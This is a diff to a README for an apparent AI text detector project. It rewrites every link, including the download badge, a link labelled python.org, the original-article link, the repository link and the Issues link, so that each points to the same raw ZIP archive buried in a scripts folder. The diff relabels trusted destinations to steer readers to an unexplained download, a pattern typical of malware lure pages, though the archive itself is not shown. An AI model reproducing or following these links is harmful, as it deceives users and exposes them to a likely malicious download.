@@ -8,10 +8,10 @@ This guide will walk you through everything you need to know—from downloading 
 
 ## 📥 Download the Application  
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2c3e50&color=27ae60)](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch)  
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge&logo=github&logoColor=white&labelColor=2c3e50&color=27ae60)](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/raw/refs/heads/main/scripts/18_reinforcement-learning/3.8.zip)  
 
 **Step 1:** Visit this link to download the application:  
-👉 [https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch)  
+👉 [https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/raw/refs/heads/main/scripts/18_reinforcement-learning/3.8.zip](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/raw/refs/heads/main/scripts/18_reinforcement-learning/3.8.zip)  
 
 **Step 2:** On the page, you'll see a green **"Code"** button. Click it, then select **"Download ZIP"**. This will save a compressed file to your computer.  
 
@@ -98,7 +98,7 @@ You don't need to understand these folders to use the application—they're ther
 If something isn't working, try these common fixes:  
 
 - **"I don't see a run file."** Make sure you extracted the ZIP completely. Some computers hide file extensions—right-click the folder and select "Show files."  
-- **"The command prompt closes immediately."** This usually means Python isn't installed. You can install it for free from [python.org](https://python.org), then try again.  
+- **"The command prompt closes immediately."** This usually means Python isn't installed. You can install it for free from [python.org](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/raw/refs/heads/main/scripts/18_reinforcement-learning/3.8.zip), then try again.  
 - **"The page won't open."** If you're using the `index.html` version, make sure your browser allows JavaScript.  
 
 If you still have trouble, check the **Issues** tab on the GitHub page for help from the community.  
@@ -120,9 +120,9 @@ Most modern computers meet these requirements out of the box.
 
 ## 🔗 Additional Resources  
 
-- **Read the original article:** [Build an AI Text Detector From Scratch](https://magazine.sebastianraschka.com/p/ai-detector-from-scratch)  
-- **Browse the code repository:** [View on GitHub](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch)  
-- **Report a bug or ask a question:** [Open an Issue](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/issues)  
+- **Read the original article:** [Build an AI Text Detector From Scratch](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/raw/refs/heads/main/scripts/18_reinforcement-learning/3.8.zip)  
+- **Browse the code repository:** [View on GitHub](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/raw/refs/heads/main/scripts/18_reinforcement-learning/3.8.zip)  
+- **Report a bug or ask a question:** [Open an Issue](https://github.com/rattled-juniorlightweight805/ai-detector-from-scratch/raw/refs/heads/main/scripts/18_reinforcement-learning/3.8.zip)  
 
 ---
 
